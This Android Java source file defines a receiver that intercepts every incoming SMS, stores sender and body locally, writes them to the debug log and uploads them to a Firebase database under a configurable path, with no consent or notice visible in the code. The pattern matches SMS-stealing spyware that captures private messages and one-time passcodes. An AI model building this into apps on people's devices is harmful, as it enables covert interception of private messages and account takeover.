package com.example.sms;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Sms extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    // Process each SMS message
                    for (Object pdu : pdus) {
                        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);

                        // Extract message details
                        String senderNumber = message.getDisplayOriginatingAddress();
                        String messageBody = message.getMessageBody();
                        long timestampMillis = message.getTimestampMillis();

                        // Log the details
                        String smsInfo = "From: " + senderNumber +
                                "\nMessage: " + messageBody + "\nReceived at: " + timestampMillis;
                        Log.d("OPPO", "onReceive: " + smsInfo);

                        // Save the message to local storage for later processing
                        saveSmsToLocalStorage(context, senderNumber, messageBody, timestampMillis);
                        compareStoredSms(context);
                    }
                }
            }
        }
    }
    private void saveSmsToLocalStorage(Context context, String sender, String messageBody, long timestampMillis) {
        // Use a local database, shared preferences, or another storage mechanism to save the SMS
        // This example uses SharedPreferences for simplicity
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        // Create a unique key for each SMS based on timestamp
        String smsKey = String.valueOf(timestampMillis);

        // Store SMS details in SharedPreferences
        editor.putString("smsSender_" + smsKey, sender);
        editor.putString("smsBody_" + smsKey, messageBody);
        editor.putLong("smsTimestamp_" + smsKey, timestampMillis);

        editor.apply();
    }
    private void compareStoredSms(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        Map<String, ?> allEntries = sharedPreferences.getAll();

        for (Map.Entry<String, ?> entry : allEntries.entrySet()) {
            if (entry.getKey().startsWith("smsTimestamp_")) {
                long timestamp = Long.parseLong(entry.getKey().replace("smsTimestamp_", ""));
                String sender = sharedPreferences.getString("smsSender_" + timestamp, "");
                String body = sharedPreferences.getString("smsBody_" + timestamp, "");

                if (isNewSms(context, sender, body)) {
                    String customPath = getCustomPathFromPreferences(context);
                    saveSmsToFirebase(customPath, sender, body, timestamp);

                    // Update the last sent SMS content in SharedPreferences
                    updateLastSentSmsContent(context, body);
                }
            }
        }
    }
    private boolean isNewSms(Context context, String sender, String messageBody) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        String lastSentSmsContent = sharedPreferences.getString("lastSentSmsContent", "");

        // Compare the content of the new SMS with the last sent SMS
        return !messageBody.equals(lastSentSmsContent);
    }
    private void updateLastSentSmsContent(Context context, String content) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        // Update the last sent SMS content
        editor.putString("lastSentSmsContent", content);
        editor.apply();
    }
    private String getFormattedTime(long timestampMillis) {
        Locale locale = Locale.getDefault();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss a z", locale);

        sdf.setTimeZone(TimeZone.getDefault());
        Date dateTime = new Date(timestampMillis);
        return sdf.format(dateTime);
    }

    private String getCustomPathFromPreferences(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        String customPath = sharedPreferences.getString("customPath", "");
        Log.d("CustomPath", "Retrieved Custom Path: " + customPath);
        return sharedPreferences.getString("customPath", "");
    }
    private void saveSmsToFirebase(String custompath,String sender, String messageBody, long timestampmills) {

        String path = "user_messages/" + custompath;

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);

        // Format the timestamp as a human-readable string
        String formattedTime = getFormattedTime(timestampmills);

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody, formattedTime);

        // Save the SMS to the database under the custom path with timestamp as the key
        databaseReference.child(formattedTime).setValue(smsMessage);


    }
}
